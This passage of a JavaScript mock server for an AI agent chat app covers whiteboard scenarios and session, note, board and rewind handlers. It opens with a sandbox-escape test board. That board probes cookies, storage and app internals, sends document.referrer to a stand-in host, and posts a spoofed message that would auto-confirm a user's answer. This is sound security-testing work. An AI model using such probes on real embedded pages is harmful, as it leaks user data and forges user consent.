note('window.__TAURI_INTERNALS__', () => (window.__TAURI_INTERNALS__ || parent.__TAURI_INTERNALS__) ? 'present' : 'blocked');
note('localStorage', () => { localStorage.setItem('x', '1'); return 'wrote ' + localStorage.length; });
note('document.cookie', () => { document.cookie = 'x=1'; return document.cookie ? 'cookie: ' + document.cookie : 'blocked'; });
note('open a popup', () => (window.open('https://example.com/popup') ? 'opened' : 'blocked'));
fetch('https://example.com/outbound?d=' + encodeURIComponent(document.referrer)).then(() => note('fetch(example.com)', () => 'sent'), (e) => note('fetch(example.com)', () => { throw e; }));
const img = new Image(); img.onload = () => note('new Image() → example.com', () => 'loaded'); img.onerror = () => note('new Image() → example.com', () => 'blocked'); img.src = 'https://example.com/x.png?probe=1';
try { parent.postMessage({ type: 'answer_board', method: 'answer_board', params: { id: '__BOARD__', ask_id: '__ASK__', answer: { type: 'confirm', yes: true } } }, '*'); note('postMessage spoofed message', () => 'posted (the app must ignore it)'); } catch (e) { note('postMessage spoofed message', () => { throw e; }); }
window.__results = results;
</script></body></html>`;

const LOCAL_APP_HTML = md`
<!doctype html><html><head><meta charset="utf-8"><title>Groceries — dev build</title><style>
:root{color-scheme:light dark;font:15px/1.5 system-ui,sans-serif}
body{margin:0;background:#f4f1ea;color:#1f1c18;display:grid;place-items:start center;min-height:100vh}
@media (prefers-color-scheme:dark){body{background:#151412;color:#ece6dc}.card{background:#1f1d1a!important}}
.card{margin:40px 16px;width:min(460px,100%);background:#fff;border-radius:10px;padding:20px 22px;box-shadow:0 10px 30px -18px rgba(0,0,0,.4)}
h1{font-size:19px;margin:0 0 12px}
form{display:flex;gap:8px;margin-bottom:10px}
input{flex:1;padding:8px 10px;border-radius:6px;border:1px solid #bbb3a6;font:inherit;background:transparent;color:inherit}
button{padding:8px 14px;border:0;border-radius:6px;background:#9a7431;color:#fff;font:inherit;cursor:pointer}
li{padding:6px 0;border-bottom:1px solid rgba(128,128,128,.2);list-style:none}
ul{padding:0;margin:0}
.dev{font-size:12px;opacity:.6;margin-top:12px}
</style></head><body><div class="card"><h1>🛒 Groceries</h1>
<form id="f"><input id="i" placeholder="Add an item" autocomplete="off"><button>Add</button></form>
<ul id="l"><li>Olive oil</li><li>Lemons</li><li>Sourdough</li></ul>
<div class="dev">dev server · port ${LOCAL_APP_PORT} · built by the agent</div></div>
<script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();const v=i.value.trim();if(!v)return;const li=document.createElement('li');li.textContent=v;l.appendChild(li);i.value='';};</script>
</body></html>`;

/** Content and ask for a sample by name (the `whiteboard` scenario and POST /__mock/board). */
function sampleBoard(kind) {
  switch (kind) {
    case 'chart': return { title: 'Reconnect latency', content: { type: 'html', html: CHART_HTML } };
    case 'markdown': return { title: 'How a reconnect resyncs', content: { type: 'markdown', markdown: MARKDOWN_BOARD } };
    case 'image': return { title: 'Mosaic study', content: { type: 'image', mime: 'image/png', data: mosaicPng() } };
    case 'url': return { title: 'example.com', content: { type: 'url', url: 'https://example.com/' } };
    case 'kasm': return { title: 'Remote desktop', content: { type: 'url', url: 'https://kasm.example.com/#/connect/desk-1' } };
    case 'local': return { title: 'Groceries app (dev)', content: { type: 'local', port: LOCAL_APP_PORT, path: '/' } };
    case 'evil': return { title: 'Escape attempts', content: { type: 'html', html: EVIL_HTML } };
    case 'signature': return { title: 'Job application', content: { type: 'html', html: APPLICATION_HTML }, ask: { prompt: 'Sign the application for ACME Corp', input: { type: 'signature' } } };
    case 'choice': return { title: 'Pick a plan', content: { type: 'markdown', markdown: '### Three ways to fix the flaky test\n\n1. **Wait for the entry**: small, exact.\n2. **Retry the assertion**: hides the race.\n3. **Serialize broadcasts**: slower for everyone.' }, ask: { prompt: 'Which fix should I apply?', input: { type: 'choice', options: ['Wait for the entry', 'Retry the assertion', 'Serialize broadcasts'] } } };
    case 'several': return { title: 'Extras', content: { type: 'markdown', markdown: '**Extras**\n\nWhich extras should the new server get? *(pick any)*\n\n- **Backups**: nightly, to the NAS\n- **Metrics**: for the dashboard\n- **Alerts**: to your phone' }, ask: { prompt: 'Which extras should the new server get?', input: { type: 'choice', options: ['Backups', 'Metrics', 'Alerts', 'Something else…'], multi: true } } };
    case 'confirm': return { title: 'Deploy', content: { type: 'markdown', markdown: '### Ready to deploy\n\nStaging passed. The change touches **reconnect** and **resync**.' }, ask: { prompt: 'Deploy to production now?', input: { type: 'confirm' } } };
    case 'text': return { title: 'Your details', content: { type: 'markdown', markdown: '### One more thing\n\nThe form needs a short reason for applying.' }, ask: { prompt: 'Why do you want this job? (a sentence or two)', input: { type: 'text', multiline: true, placeholder: 'I want to…' } } };
    default: return { title: 'Home network', content: { type: 'html', html: TOPOLOGY_HTML } };
  }
}
const BOARD_KIND_RE = [
  [/\b(evil|escape|attack|security test)/i, 'evil'],
  [/\b(sign|signature)/i, 'signature'],
  [/\b(pick several|pick any|which extras)/i, 'several'],
  [/\b(choose|choice|pick)/i, 'choice'],
  [/\b(confirm|deploy to prod)/i, 'confirm'],
  [/\b(ask me|text answer|why do)/i, 'text'],
  [/\b(chart|d3|graph|latency)/i, 'chart'],
  [/\b(markdown|notes|explain in text)/i, 'markdown'],
  [/\b(image|picture|photo)/i, 'image'],
  [/\b(kasm|remote desktop)/i, 'kasm'],
  [/\b(url|website|web ?page|example\.com)/i, 'url'],
  [/\b(local|web ?app|dev server|preview)/i, 'local'],
];
const boardKindFor = (text) => BOARD_KIND_RE.find(([re]) => re.test(text))?.[1] ?? 'topology';

/** The agent shows a board (and maybe asks on it) through the `whiteboard` tool. */
async function scenarioWhiteboard(t, text, rec, { quiet = false } = {}) {
  const kind = boardKindFor(text);
  const s = sampleBoard(kind);
  // AGENT-TILES: asked for a board, the agent opens its tile (`open: true`); on its own ("sketch", "illustrate")
  // it only makes the board: a card in the chat.
  const open = quiet ? {} : { open: true };
  const args = s.content.type === 'html' ? { action: 'show', title: s.title, html: `<!-- ${s.content.html.length} bytes -->`, ...open }
    : s.content.type === 'markdown' ? { action: 'show', title: s.title, markdown: s.content.markdown, ...open }
      : s.content.type === 'image' ? { action: 'show', title: s.title, image_path: 'art/mosaic-study.png', ...open }
        : s.content.type === 'url' ? { action: 'show', title: s.title, url: s.content.url, ...open }
          : { action: 'show', title: s.title, local_port: s.content.port, local_path: s.content.path, ...open };
  let board = null;
  const [r] = await t.step({
    thinking: `A visual helps here. Put it on a whiteboard next to the chat (${kind}).`,
    text: kind === 'signature' ? "I've filled in the application. Here it is for you to check:" : quiet ? "I'll sketch it on a whiteboard." : "I'll put this on a whiteboard next to our chat.",
    calls: [{
      name: 'whiteboard', args,
      exec: {
        duration: 350,
        run: async () => {
          board = showBoard(rec.info.id, { title: s.title, content: s.content }, quiet ? 'none' : undefined);
          return { text: `Made whiteboard ${board.id} ("${board.title}"); ${quiet ? 'it is a card in the chat that the user can open' : 'it is in a tile beside this chat'}. Pass \`id: ${board.id}\` to update it.`, details: { board: { id: board.id, title: board.title, kind: boardKind(board.content) } } };
        },
      },
    }],
  });
  if (!s.ask || !board || r.is_error) {
    await t.step({ thinking: 'Shown. Point at it briefly.', text: kind === 'evil' ? 'This board tries a few escapes; every line should say **blocked**.' : quiet ? 'I sketched it on a whiteboard: open it from the card above if you like.' : `It's in the tile beside this chat. Tell me what to change and I'll update it.` });
    return;
  }
  const [a] = await t.step({
    thinking: 'Now ask for the input on the same board and wait for the answer.',
    text: kind === 'signature' ? 'If everything looks right, please sign it on the whiteboard.' : 'One question for you on the whiteboard:',
    calls: [{
      name: 'whiteboard', args: { action: 'ask', id: board.id, prompt: s.ask.prompt, input: s.ask.input.type, ...(s.ask.input.options ? { options: s.ask.input.options } : {}) },
      exec: {
        duration: 200,
        run: async (turn, _call, rt) => {
          turn.toolOutput(rt, "Waiting for the user's answer on the whiteboard…\n");
          const ans = await askBoard(rec.info.id, { id: board.id, prompt: s.ask.prompt, input: s.ask.input }, turn);
          return { text: answerText(s.ask.input, ans, rec.info.id) };
        },
      },
    }],
  });
  const said = a?.text ?? '';
  await t.step({
    thinking: 'Answer received. Acknowledge it and say what happens next.',
    text: /declined/.test(said) ? "No problem — I won't go ahead with it." : kind === 'signature' ? 'Thanks — signed. I attached your signature to the application and submitted it. You will get a confirmation email from ACME.' : `Thanks! ${said.replace(/^The user /, 'You ')}`,
  });
}

// A tiny web app on another port: what a `local` board shows (the agent's dev server).
function startLocalApp() {
  const srv = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
    res.end(LOCAL_APP_HTML);
  });
  srv.on('error', (e) => log(`local web app (port ${LOCAL_APP_PORT}) not started: ${e.message}`));
  srv.listen(LOCAL_APP_PORT, '127.0.0.1');
}

const VOICE_PHRASES = [
  'Run the tests and fix anything that fails.',
  "Summarize what changed in the last three commits and whether anything looks risky.",
  'Plan a small refactor of the session store, step by step, before touching any code.',
  "What's on my calendar tomorrow, and is there time for a focused two-hour block?",
];

// ─── rewind (engine/rewind.rs) ─────────────────────────────────────────────
// The engine restores files from snapshots `write`/`edit` take; the mock reads
// the same story off the history: every write/edit after `to_seq` changed a
// file, a `write` to a path nothing had read or edited before created it, and
// a shell command that names a file with a mutating verb (sed -i, rustfmt, >,
// mv, …) or runs a formatter over everything changed it too.
const MUTATING_SHELL = /\b(sed\s+-i|perl\s+-[a-z]*i|rustfmt|prettier|black|gofmt\s+-w|tee|mv|cp|rm|truncate|patch|git\s+(checkout|restore|apply|stash))\b|>{1,2}/;
const FORMAT_ALL = /\b(cargo\s+fmt(?!\s+--check)|npm\s+run\s+format|prettier\s+--write\s+\.)/;
const callsOf = (e) => (e.kind === 'assistant' ? e.content.filter((p) => p.type === 'tool_call') : []);
/** Shell commands in these entries: whatever they changed isn't undone. */
const shellCommands = (entries) => entries.flatMap((e) => callsOf(e).filter((c) => c.name === 'bash' && typeof c.arguments?.command === 'string').map((c) => oneLine(c.arguments.command, 200)));
/** `to_seq`, moved back to before an assistant message whose tool calls would lose their results. */
function safePoint(entries, toSeq) {
  const asst = entries.findLast((e) => e.seq <= toSeq && callsOf(e).length);
  if (!asst) return toSeq;
  const ids = new Set(callsOf(asst).map((c) => c.id));
  return entries.some((e) => e.seq > toSeq && e.kind === 'tool_result' && ids.has(e.call_id)) ? asst.seq - 1 : toSeq;
}
/** Per path the agent changed after `toSeq`: whether it created the file, and whether something changed it after its last edit. */
function changedFiles(rec, toSeq) {
  const undone = (seq, path) => rec.undone.some((u) => seq > u.after && seq <= u.until && u.paths.has(path));
  const seen = new Set(); // paths read or edited before being written
  const files = new Map();
  for (const e of rec.entries) {
    for (const c of callsOf(e)) {
      const path = typeof c.arguments?.path === 'string' ? c.arguments.path : null;
      if (c.name === 'bash') {
        if (e.seq <= toSeq) continue;
        const cmd = String(c.arguments?.command ?? '');
        for (const [p, f] of files) if (FORMAT_ALL.test(cmd) || (MUTATING_SHELL.test(cmd) && cmd.includes(p))) f.touched = true;
        continue;
      }
      if (!path) continue;
      if (e.seq <= toSeq || !(c.name === 'write' || c.name === 'edit') || undone(e.seq, path)) {
        seen.add(path);
        continue;
      }
      const f = files.get(path);
      if (f) f.touched = false; // the agent's own later edit: what matters is what happened after its last one
      else files.set(path, { created: c.name === 'write' && !seen.has(path), touched: false });
    }
  }
  return files;
}
/** restore_files: what goes back, what goes, what stays and why. */
function planFiles(files, dry, res) {
  for (const [path, f] of files) {
    if (!f.created) {
      if (f.touched) res.notes.push(`${path} had changes made after the agent's last edit (by a command or by hand); ${dry ? 'rewinding would overwrite' : 'rewinding overwrote'} them.`);
      res.restored.push(path);
    } else if (f.touched) {
      res.skipped.push({ path, reason: "created by the agent, but changed since it wrote it; delete it yourself if it should go" });
    } else {
      res.deleted.push(path);
    }
  }
}
/** A copy of `src` holding `entries` (fork_session, and the "(rewound)" branch a rewind keeps). */
function copySession(src, entries, title) {
  const t = now();
  const r = recalc(entries, src.info.context.window);
  const info = {
    id: `ses_${hex(6)}`, title, kind: src.info.kind === 'channel' ? 'channel' : 'chat',
    cwd: src.info.cwd, model: { ...src.info.model }, thinking: src.info.thinking, permission: src.info.permission, status: 'idle',
    parent_id: src.info.id, ...(src.info.bot_id ? { bot_id: src.info.bot_id } : {}), members: [...src.info.members],
    created_at: t, updated_at: t, last_seq: r.last_seq, usage: r.usage, context: r.context, pinned: false, archived: false,
    preview: r.preview, ...(src.info.task ? { task: clone(src.info.task) } : {}), private: false, steps: countSteps(entries),
  };
  const rec = newRecord(info, entries);
  rec.undone = src.undone.map((u) => ({ ...u, paths: new Set(u.paths) }));
  state.sessions.set(info.id, rec);
  emitSession(rec);
  return rec;
}

const handlers = {
  hello(p, conn) {
    conn.client = `${p.client ?? '?'} ${p.version ?? ''}`.trim();
    return state.serverInfo;
  },
  list_sessions(p) {
    const archived = !!p.archived;
    return [...state.sessions.values()].map((r) => r.info)
      .filter((i) => i.archived === archived && i.kind !== 'subagent') // chat, job and channel sessions
      .sort((a, b) => b.updated_at - a.updated_at);
  },
  create_session(p, conn) {
    // A new chat starts at the level last picked for its model (ModelInfo.last_thinking), else the model's default.
    const remembered = (model) => modelInfo(model ?? state.serverInfo.default_model ?? { provider: 'anthropic', model: 'claude-sonnet-5-5' })?.last_thinking;
    if (p.private === true) { // cwd and bot_id are ignored; titled from the first message; this device's alone
      const title = typeof p.title === 'string' ? p.title.trim() : '';
      const model = p.model ? modelRef(p.model) : null;
      const rec = createSession({ cwd: HOME, model, title: title || 'Private chat', private: true, thinking: remembered(model), owner: conn?.deviceId });
      rec.untitled = !title;
      return rec.info;
    }
    let bot = null;
    if (p.bot_id != null && String(p.bot_id) !== '') {
      bot = botById(String(p.bot_id));
      if (!bot) throw notFound(`Bot not found: ${p.bot_id}`);
    }
    // A bot chat takes the bot's model, thinking, permission and cwd unless the request says otherwise.
    const model = p.model ? modelRef(p.model) : bot?.model ?? null;
    const rec = createSession({
      cwd: p.cwd ? expandHome(String(p.cwd)) : bot?.cwd,
      model,
      title: typeof p.title === 'string' ? p.title : '',
      thinking: remembered(model),
      // Without a bot: the freedom default set for all devices, when one is (engine.rs create_session).
      ...(bot ? { bot_id: bot.id, thinking: bot.thinking ?? remembered(model) ?? 'auto', permission: bot.permission }
        : settingsState().security.default_permission ? { permission: settingsState().security.default_permission } : {}),
    });
    return rec.info;
  },
  get_session(p) {
    const since = p.since_seq == null ? null : Number(p.since_seq);
    return snapshot(getRec(p), since);
  },
  get_session_page(p) {
    const rec = getRec(p), snap = snapshot(rec, Number.MAX_SAFE_INTEGER);
    let end = rec.entries.length;
    if (p.before_seq != null) {
      let lo = 0, hi = end;
      while (lo < hi) { const mid = (lo + hi) >> 1; if (rec.entries[mid].seq < p.before_seq) lo = mid + 1; else hi = mid; }
      end = lo;
    }
    const limit = Math.max(1, Math.min(200, p.limit ?? 120));
    let start = end, bytes = 0;
    while (start > 0 && end - start < limit) {
      const { seq, ts, ...body } = rec.entries[start - 1];
      const size = Buffer.byteLength(JSON.stringify(body));
      if (start < end && bytes + size > 512 * 1024) break;
      bytes += size; start--;
    }
    snap.entries = rec.entries.slice(start, end).filter((entry) => {
      if (entry.kind === 'user') return !(entry.author === 'harness' && textOf(entry.content).trimStart().startsWith('[Completion check]'));
      if (entry.kind !== 'assistant') return true;
      if (entry.author === 'harness:completion') return false;
      const text = entry.content.filter((part) => part.type === 'text').map((part) => part.text).join('').trim();
      const ack = /[✓✔✅]/u.test(text) && !text.includes('\n') && /^(done|checked|ok|okay|acknowledged)?$/i.test(text.replace(/^[✓✔✅.!\s]+|[✓✔✅.!\s]+$/gu, ''));
      return !ack || entry.content.some((part) => part.type === 'tool_call');
    });
    if (start > 0) snap.history_before = rec.entries[start].seq;
    return snap;
  },
  update_session(p) {
    const rec = getRec(p), info = rec.info;
    if (p.archived === true && info.private) throw badRequest("private chats can't be archived");
    if (p.title != null) { info.title = String(p.title); rec.untitled = false; }
    if (p.model != null) {
      info.model = modelRef(p.model);
      if (!mockDaybreak(info.model)) rec.info.daybreak = false;
      info.context.window = windowFor(info.model);
      info.context.tokens = Math.min(info.context.tokens, info.context.window);
      // What the new model really supports, starting from the level last picked for it.
      const last = userChat(info) ? modelInfo(info.model)?.last_thinking : undefined;
      info.thinking = snapThinking(p.thinking ?? last ?? info.thinking, info.model);
    }
    if (p.thinking != null) {
      const level = oneOf(p.thinking, THINKING, 'thinking level');
      const m = modelInfo(info.model);
      if (m && m.thinking.length && !m.thinking.some((o) => o.level === level)) {
        throw badRequest(`${m.name} doesn't support thinking level \`${level}\` (supported: ${m.thinking.map((o) => o.level).join(', ')})`);
      }
      info.thinking = m && !m.thinking.length ? 'auto' : level;
      if (userChat(info)) rememberThinking(info.model, info.thinking); // new chats on this model start here
    }
    if (p.permission != null) info.permission = permissionOf(p.permission);
    if (p.fast != null) info.fast = !!p.fast; // kept as asked; only models with ModelInfo.fast act on it
    if (p.subagents != null) { // SessionInfo.subagents: skipped when true (the default)
      if (p.subagents) delete info.subagents;
      else info.subagents = false;
    }
    if (p.pinned != null) info.pinned = !!p.pinned;
    if (p.archived != null) info.archived = !!p.archived;
    if (p.cwd != null) info.cwd = expandHome(String(p.cwd));
    if (p.members != null) {
      if (info.kind !== 'channel') throw badRequest('Only channels have members');
      if (info.bot_id) throw badRequest('The members of a private conversation between bots cannot be changed');
      info.members = resolveMembers(p.members);
    }
    emitSession(rec);
    return info;
  },
  set_session_daybreak(p) {
    const rec = getRec(p), model = modelInfo(rec.info.model);
    const prov = state.providers.find((x) => x.id === rec.info.model.provider);
    if (p.enabled && (!prov?.authenticated || !FAST_KINDS.has(prov.kind) || !mockDaybreak(rec.info.model))) {
      throw badRequest('OpenAI has not confirmed Daybreak Blue access for this model.');
    }
    rec.info.daybreak = !!p.enabled;
    emitSession(rec);
    return rec.info;
  },
  delete_session(p) {
    const rec = getRec(p);
    const turn = rec.turn;
    turn?.cancel();
    rec.turn = null;
    if (rec.compactTimer) clearTimeout(rec.compactTimer);
    for (const child of [...state.sessions.values()]) {
      if (child.info.parent_id === rec.info.id && child.info.kind === 'subagent' && child.info.parent_call) handlers.delete_session({ session_id: child.info.id });
    }
    state.sessions.delete(rec.info.id);
    forgetNotifications(rec.info.id);
    for (const b of [...state.boards.values()]) if (b.session_id === rec.info.id) deleteBoard(b.id);
    // Passwords and keys kept for this chat alone go with it.
    for (const [n, s] of [...state.secrets]) if (s.chat === rec.info.id) state.secrets.delete(n);
    broadcast({ type: 'session_removed', session_id: rec.info.id });
    turn?.onFinish?.('aborted'); // e.g. a bot waiting on a reply in this DM, or a subagent's parent
    unqueueChild(rec.info.id); // a subagent that was still waiting for a slot
    stopBackground(rec); // its background subagents stop too (their reports have nowhere to go)
    stopBotHandoffs(rec); // and bots working for it
    return null;
  },
  set_goal(p) {
    const rec = getRec(p);
    const goal = String(need(p, 'goal')).trim();
    if (Buffer.byteLength(goal) > 4000) throw badRequest('keep the goal under 4000 characters');
    const had = !!rec.info.task?.goal;
    rec.info.task ??= emptyLedger();
    rec.info.task.goal = goal;
    const note = goal ? `[The user set the goal for this session]\n${goal}` : had ? '[The user cleared the session goal]' : null;
    if (note) {
      const content = [{ type: 'text', text: note }];
      if (rec.turn) rec.steers.push({ content, author: 'goal' }); // told to the agent at its next step; not in `queued`
      else {
        addEntry(rec, { kind: 'user', content, author: 'goal' });
        rec.info.preview = computePreview(rec.entries);
      }
    }
    emitSession(rec);
    return rec.info;
  },
  dequeue(p) {
    const rec = getRec(p);
    const { list, w } = queuedSlot(rec, Number(need(p, 'index')));
    list.splice(list.indexOf(w), 1);
    emitQueue(rec);
    return null;
  },
  edit_queued(p) {
    const rec = getRec(p);
    const w = queuedTarget(rec, Number(need(p, 'index')));
    const text = String(need(p, 'text'));
    if (!text.trim() && !w.content.some((c) => c.type !== 'text')) throw badRequest('Message is empty');
    // The text changes; images and attached files stay.
    w.content = [...w.content.filter((c) => c.type !== 'text' || ATTACHED_RE.test(c.text)), ...(text.trim() ? [{ type: 'text', text }] : [])];
    emitQueue(rec);
    return null;
  },
  steer_queued(p) {
    const rec = getRec(p);
    const w = queuedTarget(rec, Number(need(p, 'index')));
    const i = rec.followups.indexOf(w);
    if (i >= 0) {
      rec.followups.splice(i, 1);
      if (rec.turn && rec.info.kind !== 'channel') rec.steers.push(w); // read at the agent's next step
      else rec.followups.unshift(w); // nothing to steer: it simply goes next
    }
    emitQueue(rec);
    return null;
  },
  interrupt_queued(p) {
    const rec = getRec(p);
    const { list, w } = queuedSlot(rec, Number(need(p, 'index')));
    if (list === rec.sendNow) return null; // on its way already
    list.splice(list.indexOf(w), 1);
    emitQueue(rec);
    interrupt(rec, w);
    return null;
  },
  list_boards(p) {
    const sid = p.session_id == null ? null : String(p.session_id);
    return [...state.boards.values()].filter((b) => !sid || b.session_id === sid).sort((a, b) => a.created_at - b.created_at);
  },
  get_board(p) {
    const b = state.boards.get(String(need(p, 'id')));
    if (!b) throw notFound(`no whiteboard \`${p.id}\``);
    return b;
  },
  list_notes() {
    return [...state.notes.values()].sort((a, b) => b.updated_at - a.updated_at).map(noteInfo);
  },
  get_note(p) {
    const n = state.notes.get(String(need(p, 'id')));
    if (!n) throw notFound(`no note \`${p.id}\``);
    return noteLatency ? new Promise((r) => setTimeout(() => r(n), noteLatency)) : n;
  },
  save_note(p) { // the user writes a note (the agent's `note` tool goes through saveNote too)
    const n = saveNote({ id: p.id == null ? null : String(p.id), title: p.title, content: p.content, base_version: p.base_version, session_id: p.session_id, by_user: true });
    // A slow link (`mock_note_latency`): the change is broadcast at once, the answer comes later, as on a phone.
    return noteLatency ? new Promise((r) => setTimeout(() => r(n), noteLatency)) : n;
  },
  delete_note(p) {
    const id = String(need(p, 'id'));
    if (!state.notes.has(id)) throw notFound(`no note \`${id}\``);
    deleteNote(id);
    return null;
  },
  set_note_agents(p) { // the user's choice: keep it from agents and bots, or not (no new version)
    return keepNoteFromAgents(String(need(p, 'id')), !!p.keep_from_agents);
  },
  set_note_bots(p) { // older apps: "Only bots I add" keeps it from agents, "All my bots" opens it to them
    return keepNoteFromAgents(String(need(p, 'id')), !p.all_bots);
  },
  note_history(p) { // the versions kept from before the current one, newest first, without their text
    const id = String(need(p, 'id'));
    if (!state.notes.has(id)) throw notFound(`no note \`${id}\``);
    return (state.noteVersions.get(id) ?? []).map((v) => ({ ...v, content: '' }));
  },
  get_note_version(p) {
    const id = String(need(p, 'id'));
    const n = state.notes.get(id);
    if (!n) throw notFound(`no note \`${id}\``);
    const version = Number(need(p, 'version'));
    if (version === n.version) return { version, title: n.title, content: n.content, updated_at: n.updated_at, agent_edit: !!n.agent_edit, ...(n.edit_session ? { edit_session: n.edit_session } : {}) };
    const v = (state.noteVersions.get(id) ?? []).find((x) => x.version === version);
    if (!v) throw notFound(`version ${version} of this note isn't kept`);
    return v;
  },
  put_note_asset(p) { // a picture for notes, kept by its content (engine notes.rs put_note_asset)
    const bytes = Buffer.from(String(need(p, 'data')), 'base64');
    if (bytes.length > NOTE_ASSET_MAX) throw badRequest('pictures in notes are at most 8 MB');
    const kind = pictureKind(bytes);
    if (!kind) throw badRequest("that isn't a PNG, JPEG, WebP or GIF picture");
    const name = `${crypto.createHash('sha256').update(bytes).digest('hex').slice(0, 16)}.${kind.ext}`;
    state.noteAssets.set(name, bytes);
    return { name, mime: kind.mime, size: bytes.length, width: kind.width, height: kind.height };
  },
  read_note_asset(p) { // a piece of a picture (FileChunk)
    const name = String(need(p, 'name'));
    const bytes = /^[0-9a-f]{16}\.(png|jpg|webp|gif)$/.test(name) ? state.noteAssets.get(name) : null;
    if (!bytes) throw notFound('this picture is no longer on the server');
    const off = Math.max(0, Number(p.offset ?? 0));
    if (off > bytes.length) throw badRequest('offset past the end of the picture');
    const len = Math.min(1 << 20, Math.max(1, Number(p.len) || 1 << 20));
    const part = bytes.subarray(off, off + len);
    return { data: part.toString('base64'), offset: off, size: bytes.length, eof: off + part.length >= bytes.length };
  },
  note_backlinks(p) { // the notes whose text links here with [[its title]] (or [[its id]]), newest first
    const id = String(need(p, 'id'));
    const n = state.notes.get(id);
    if (!n) throw notFound(`no note \`${id}\``);
    const title = n.title.trim().toLowerCase();
    const links = (text) => [...text.matchAll(/\[\[([^\]\n[]+)\]\]/g)].map((m) => m[1].split(/[|#]/)[0].trim());
    return [...state.notes.values()]
      .filter((o) => o.id !== id && links(o.content).some((t) => t === id || t.toLowerCase() === title))
      .sort((a, b) => b.updated_at - a.updated_at)
      .map(noteInfo);
  },
  preview_page(p) { // a page for a note's HTML, served like a board's (GET /preview/<token>/)
    const html = String(need(p, 'html'));
    if (Buffer.byteLength(html) > 512 << 10) throw badRequest('previews are at most 512 KB');
    const token = hex(16);
    previewPages.set(token, html);
    if (previewPages.size > 16) previewPages.delete(previewPages.keys().next().value);
    return { path: `/preview/${token}/` };
  },
  board_snapshot(p) { // a device answers a board_snapshot_request (image, or why it can't)
    const rid = String(need(p, 'request_id'));
    const image = p.image && typeof p.image === 'object' ? { mime: String(p.image.mime), data: String(p.image.data), width: Number(p.image.width), height: Number(p.image.height) } : null;
    if (image && !/^image\/(png|jpeg|webp)$/.test(image.mime)) throw badRequest('the snapshot must be PNG, JPEG or WebP');
    state.snapshots.push({ request_id: rid, image: image ? { mime: image.mime, width: image.width, height: image.height, bytes: Buffer.from(image.data, 'base64').length } : null, error: p.error ?? null, at: now() });
    state.snapshotWaits.get(rid)?.({ image, error: p.error ?? null });
    return null;
  },
  create_board(p) { // the user shows something beside a chat (engine CreateBoard): same checks and placement as the tool
    const sid = String(need(p, 'session_id'));
    const rec = state.sessions.get(sid);
    if (!rec) throw notFound(`Session not found: ${sid}`);
    if (rec.info.kind === 'channel' && rec.info.bot_id) throw badRequest('Private conversations between bots are read-only');
    // `placed`: the device already shows it in a tile of its own (a spawned web view).
    return showBoard(sid, { title: String(p.title ?? ''), content: need(p, 'content'), byUser: true }, p.placed === true ? 'none' : undefined);
  },
  delete_board(p) {
    const id = String(need(p, 'id'));
    if (!state.boards.has(id)) throw notFound(`no whiteboard \`${id}\``);
    deleteBoard(id);
    return null;
  },
  answer_board(p) {
    const id = String(need(p, 'id'));
    const b = state.boards.get(id);
    if (!b) throw notFound(`no whiteboard \`${id}\``);
    const askId = String(need(p, 'ask_id'));
    const w = state.boardAsks.get(askId);
    if (!b.ask || b.ask.id !== askId || !w || w.boardId !== id) throw notFound('that question was already answered');
    const answer = need(p, 'answer');
    if (!answerFits(b.ask.input, answer)) throw badRequest("that answer doesn't fit the question");
    const sigInfo = (png) => { const buf = Buffer.from(png, 'base64'); return { type: 'signature', bytes: buf.length, width: buf.readUInt32BE(16), height: buf.readUInt32BE(20), color_type: buf[25] }; };
    state.answers.push({ board_id: id, ask_id: askId, answer: answer.type === 'signature' ? sigInfo(answer.png) : answer });
    state.boardAsks.delete(askId);
    w.resolve(answer);
    return null;
  },
  board_link(p) {
    const id = String(need(p, 'id'));
    const b = state.boards.get(id);
    if (!b) throw notFound(`no whiteboard \`${id}\``);
    if (b.content.type !== 'html') throw badRequest('only HTML boards are served as pages');
    let grant = state.boardTokens.get(id);
    if (!grant || grant.version !== b.version || grant.expires <= Date.now()) {
      grant = { token: hex(16), version: b.version, expires: Date.now() + 86_400_000 };
      state.boardTokens.set(id, grant);
    }
    return { path: `/board/${id}/${grant.token}/` };
  },
  board_fetch() {
    throw badRequest('the mock serves `local` boards directly (http://127.0.0.1:' + LOCAL_APP_PORT + '/)');
  },
  fork_session(p) {
    const src = getRec(p);
    if (src.info.private) throw badRequest("private chats can't be forked");
    const at = p.at_seq == null ? null : Number(p.at_seq);
    const entries = clone(src.entries.filter((e) => at == null || e.seq <= at));
    return copySession(src, entries, `Fork of ${src.info.title || 'Untitled'}`).info;
  },
  rewind(p) {
    const rec = getRec(p);
    const files = !!p.files, conversation = !!p.conversation, dry = !!p.dry_run;
    if (!files && !conversation) throw badRequest('choose what to rewind: `files`, `conversation` or both');
    if (rec.info.private) throw badRequest("private chats can't be rewound");
    if (rec.info.kind === 'subagent') throw badRequest("a subagent's session can't be rewound; rewind the chat that started it");
    const childrenRunning = rec.batches.some((b) => b.agents.some((a) => !a.done));
    if (rec.turn || rec.compactTimer || rec.info.status === 'compacting' || childrenRunning) {
      throw new RpcError('busy', 'the session is running; stop it (and its subagents) before rewinding');
    }
    const want = Number(need(p, 'to_seq'));
    if (!Number.isInteger(want) || want < 0) throw badRequest('`to_seq` must be a whole number');
    const toSeq = safePoint(rec.entries, Math.min(want, rec.info.last_seq));
    const after = rec.entries.filter((e) => e.seq > toSeq);
    const res = {
      to_seq: toSeq, dry_run: dry, restored: [], deleted: [], skipped: [], not_undone: shellCommands(after), notes: [],
      removed_entries: conversation ? after.length : 0, session: rec.info,
    };
    if (!after.length) return res; // nothing after that point
    const changed = changedFiles(rec, toSeq);
    if (files) planFiles(changed, dry, res);
    if (dry) return res;
    if (files && (res.restored.length || res.deleted.length)) {
      // Those changes are undone now: a later rewind won't offer them again.
      rec.undone.push({ after: toSeq, until: rec.info.last_seq, paths: new Set([...res.restored, ...res.deleted]) });
    }
    if (conversation) {
      const branch = copySession(rec, clone(rec.entries), `${rec.info.title} (rewound)`);
      rec.historyRevision = (rec.historyRevision ?? 0) + 1;
      rec.entries = rec.entries.filter((e) => e.seq <= toSeq);
      rec.seq = toSeq;
      // Undo records past the cut would reach the entries that reuse those seqs.
      rec.undone = rec.undone.filter((u) => u.after < toSeq).map((u) => ({ ...u, until: Math.min(u.until, toSeq) }));
      const r = recalc(rec.entries, rec.info.context.window);
      Object.assign(rec.info, { last_seq: toSeq, updated_at: now(), usage: r.usage, context: r.context, preview: r.preview, steps: countSteps(rec.entries) });
      broadcast({ type: 'session_rewound', session_id: rec.info.id, to_seq: toSeq });
      emitSession(rec);
